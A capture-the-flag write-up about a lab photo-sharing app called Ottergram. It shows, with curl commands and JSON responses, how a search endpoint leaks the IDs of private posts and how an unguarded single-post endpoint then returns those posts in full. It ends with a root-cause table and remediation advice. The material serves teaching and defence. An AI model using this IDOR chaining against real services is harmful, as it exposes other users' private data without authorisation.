# Ottergram — Reading Private Posts (Broken Access Control / IDOR)

**Platform:** BugForge Daily CTF
**Target:** `https://lab-<id>.labs-app.bugforge.io/login`
**Category:** Web — Broken Access Control / IDOR / Information Disclosure
**Hint:** *"Can you read private posts?"*
**Flag:** `bug{G7RTZ0LJJUSkKffvwDegwNYeZdfpgb9Z}`

---

## Summary

Ottergram is a React single-page "otter photo sharing" app. Posts can be **public** or **private**. The
public feed (`GET /api/posts`) correctly hides private posts, but two flaws combine to fully expose them:

1. The **search endpoint leaks the `public_id` (UUID) of private posts** while only redacting their content.
2. The **single-post endpoint (`GET /api/posts/{public_id}`) does not enforce the privacy flag** — anyone
   who knows the `public_id` gets the full post, including the otherwise-hidden private content.

Chaining the two lets any authenticated user read any private post.

---

## Recon

The login page is a React SPA titled **Ottergram**. The entire app logic lives in a single JS bundle:

```bash
curl -s https://<target>/static/js/main.<hash>.js -o main.js
grep -oE '"/api[a-zA-Z0-9_/-]*"' main.js | sort -u
```

This revealed the API surface, including:

```
/api/login   /api/register   /api/posts   /api/posts/   /api/profile/   /api/search   ...
```

A normal account was registered to obtain a JWT:

```bash
curl -s -X POST https://<target>/api/register -H 'Content-Type: application/json' \
  -d '{"username":"hacker99","email":"hacker99@test.com","password":"Password123!"}'
```

Response includes a bearer token used for all subsequent requests.

---

## Finding the gap

Listing the public feed showed sequential post IDs **1–7, 9–16 — id 8 was missing**, suggesting a hidden
(private) post:

```bash
curl -s https://<target>/api/posts -H "Authorization: Bearer $T"
```

Two more observations from reading the bundle and probing:

- `GET /api/posts/1` → `{"error":"Post not found"}`, but id 1 clearly exists in the feed.
  The single-post route (`/api/posts/{e}` in the bundle) keys off the **`public_id` UUID**, not the numeric id.
- `GET /api/posts/<public_id>` returns the full post object.

So to read the hidden post I needed its `public_id`.

---

## The leak

The search endpoint returns results for **all** posts — and for private ones it includes the `id`
(public_id) and `username` while only stripping the caption/image:

```bash
curl -s "https://<target>/api/search?q=otter" -H "Authorization: Bearer $T"
```

```json
{"id":"f8b6d49a-8611-4aa7-813b-460b55374a85","username":"kelp_forest","private":true}
```

The privacy check was applied to the *content fields* but **not to the identifier**, leaking exactly the
UUID needed to address the post directly.

---

## Exploitation

Feed the leaked `public_id` to the unprotected single-post endpoint:

```bash
curl -s "https://<target>/api/posts/f8b6d49a-8611-4aa7-813b-460b55374a85" \
  -H "Authorization: Bearer $T"
```

```json
{
  "id": 8,
  "public_id": "f8b6d49a-8611-4aa7-813b-460b55374a85",
  "user_id": 5,
  "username": "kelp_forest",
  "caption": "Quiet morning with the otters 🦦🌅 bug{G7RTZ0LJJUSkKffvwDegwNYeZdfpgb9Z}",
  ...
}
```

The private post (id 8, the one missing from the feed) is returned in full.

**Flag:** `bug{G7RTZ0LJJUSkKffvwDegwNYeZdfpgb9Z}`

---

## Root cause

Authorization was enforced inconsistently across endpoints:

| Endpoint | Privacy enforced? |
|---|---|
| `GET /api/posts` (feed) | ✅ private posts excluded |
| `GET /api/search` | ⚠️ content redacted but **public_id leaked** |
| `GET /api/posts/{public_id}` | ❌ **no privacy / ownership check** |

Using a random UUID as the identifier is *security through obscurity* — it is not an access control. The
search endpoint then handed out that "obscure" identifier, collapsing the only barrier.

## Remediation

- On `GET /api/posts/{public_id}`, verify the requester is the owner, an approved follower, or that the post
  is public before returning it. Return `404` otherwise.
- Never return identifiers (or any field) for resources the caller is not authorized to view; redact the
  entire record in search, not just selected columns.
- Apply a single, centralized authorization policy to every endpoint that resolves a post.

## Timeline of requests

1. `POST /api/register` → obtain JWT.
2. `GET /api/posts` → notice id 8 missing.
3. `GET /api/search?q=otter` → leak private post's `public_id`.
4. `GET /api/posts/{public_id}` → read private post → flag.
